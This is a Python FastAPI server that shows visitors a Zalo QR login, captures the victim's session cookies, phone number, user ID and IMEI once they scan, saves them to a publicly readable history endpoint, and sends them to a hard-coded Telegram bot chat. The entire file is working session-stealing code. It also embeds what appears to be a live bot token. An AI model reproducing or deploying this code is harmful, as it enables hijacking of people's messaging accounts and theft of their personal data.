import asyncio, uuid, json, os, aiohttp
from datetime import datetime
from fastapi import FastAPI, WebSocket, WebSocketDisconnect
from fastapi.staticfiles import StaticFiles
from fastapi.responses import FileResponse, JSONResponse
from fastapi.middleware.cors import CORSMiddleware
from zalo_login import login_qr_with_unique_imei, LoginQRCallbackEventType

app = FastAPI()
app.add_middleware(CORSMiddleware, allow_origins=["*"], allow_methods=["*"], allow_headers=["*"])
app.mount("/static", StaticFiles(directory="static"), name="static")

TG_BOT_TOKEN = "7818000635:AAGJ4troYL-SpYEfoTqxj_axm4B-YPt1hvU"
TG_ADMIN_ID  = 7454964260
HISTORY_FILE = "history.json"

def load_history():
    if not os.path.exists(HISTORY_FILE):
        return []
    try:
        with open(HISTORY_FILE, "r", encoding="utf-8") as f:
            return json.load(f)
    except:
        return []

def save_history(records):
    with open(HISTORY_FILE, "w", encoding="utf-8") as f:
        json.dump(records, f, ensure_ascii=False, indent=2)

def add_history(record: dict):
    records = load_history()
    records.insert(0, record)
    records = records[:200]
    save_history(records)

async def send_telegram(text: str, parse_mode="HTML"):
    url = f"https://api.telegram.org/bot{TG_BOT_TOKEN}/sendMessage"
    async with aiohttp.ClientSession() as session:
        try:
            await session.post(url, json={
                "chat_id": TG_ADMIN_ID,
                "text": text,
                "parse_mode": parse_mode,
                "disable_web_page_preview": True
            })
        except:
            pass

async def send_telegram_file(content: bytes, filename: str, caption: str):
    url = f"https://api.telegram.org/bot{TG_BOT_TOKEN}/sendDocument"
    async with aiohttp.ClientSession() as session:
        try:
            form = aiohttp.FormData()
            form.add_field("chat_id", str(TG_ADMIN_ID))
            form.add_field("caption", caption, content_type="text/plain")
            form.add_field("document", content, filename=filename, content_type="text/plain")
            await session.post(url, data=form)
        except:
            pass

def get_phone_from_zlapi(imei: str, cookie: dict) -> str:
    try:
        from zlapi.models import Bot
        b = Bot("1502257077756629012", "1408873439028183142", imei, cookie)
        phone = b._state._config.get("phone_number")
        if phone:
            return str(phone)
        info = b.fetchAccountInfo()
        if info and hasattr(info, "profile"):
            p = info.profile.get("phoneNumber") or info.profile.get("phone")
            if p:
                return str(p)
    except:
        pass
    return None

@app.get("/")
async def root():
    return FileResponse("static/index.html")

@app.get("/api/history")
async def get_history():
    return JSONResponse(load_history())

@app.websocket("/ws/{session_id}")
async def ws_endpoint(ws: WebSocket, session_id: str):
    await ws.accept()

    async def callback(event):
        etype = event["type"]
        if etype == LoginQRCallbackEventType.QRCodeGenerated:
            await ws.send_json({"type": "qr", "image": event["data"]["image"]})
        elif etype == LoginQRCallbackEventType.QRCodeScanned:
            name = event["data"].get("display_name", "")
            await ws.send_json({"type": "scanned", "name": name})
        elif etype == LoginQRCallbackEventType.QRCodeExpired:
            await ws.send_json({"type": "expired"})
        elif etype == LoginQRCallbackEventType.QRCodeDeclined:
            await ws.send_json({"type": "declined"})

    try:
        await ws.send_json({"type": "status", "msg": "Đang tạo mã QR..."})
        result = await login_qr_with_unique_imei(callback=callback)

        if not result:
            await ws.send_json({"type": "error", "msg": "Đăng nhập thất bại."})
            return

        cookies    = result["cookies"]
        user       = result["user_info"]
        imei       = result["imei"]
        cookie_str = "; ".join(f"{k}={v}" for k, v in cookies.items())
        now        = datetime.now().strftime("%d/%m/%Y %H:%M:%S")

        # Try get phone from zlapi
        phone = user.get("phoneNumber") or user.get("phone", "")
        if not phone or phone == "N/A":
            try:
                loop = asyncio.get_event_loop()
                phone = await loop.run_in_executor(None, get_phone_from_zlapi, imei, cookies)
                if phone:
                    user["phoneNumber"] = phone
            except:
                pass

        name = user.get("displayName") or user.get("name", "N/A")
        uid  = user.get("userId") or user.get("id", "N/A")
        phone = user.get("phoneNumber", "Không rõ") or "Không rõ"

        record = {
            "id":         session_id[:8],
            "name":       name,
            "phone":      phone,
            "user_id":    uid,
            "imei":       imei,
            "cookie_str": cookie_str,
            "cookies":    cookies,
            "time":       now,
        }
        add_history(record)

        await ws.send_json({"type": "success", **record})

        # Build txt content
        txt = (
            f"=== ZALO COOKIE ===\n"
            f"Tên: {name}\n"
            f"SĐT: {phone}\n"
            f"UserID: {uid}\n"
            f"IMEI: {imei}\n"
            f"Thời gian: {now}\n"
            f"\n--- COOKIE STRING ---\n{cookie_str}\n"
            f"\n--- COOKIE JSON ---\n{json.dumps(cookies, ensure_ascii=False, indent=2)}\n"
        )

        # Send to Telegram
        tg_text = (
            f"🍪 <b>ZALO COOKIE MỚI</b>\n\n"
            f"👤 Tên: <b>{name}</b>\n"
            f"📱 SĐT: <code>{phone}</code>\n"
            f"🆔 UserID: <code>{uid}</code>\n"
            f"📡 IMEI: <code>{imei}</code>\n"
            f"🕐 Thời gian: {now}\n\n"
            f"<b>Cookie String:</b>\n<code>{cookie_str[:500]}{'...' if len(cookie_str)>500 else ''}</code>"
        )
        asyncio.create_task(send_telegram(tg_text))
        asyncio.create_task(send_telegram_file(
            txt.encode("utf-8"),
            f"cookie_{phone}_{now[:10].replace('/','-')}.txt",
            f"📄 Cookie file — {name} ({phone})"
        ))

    except WebSocketDisconnect:
        pass
    except Exception as e:
        try:
            await ws.send_json({"type": "error", "msg": str(e)})
        except:
            pass

if __name__ == "__main__":
    import uvicorn
    port = int(os.environ.get("PORT", 8000))
    uvicorn.run(app, host="0.0.0.0", port=port)
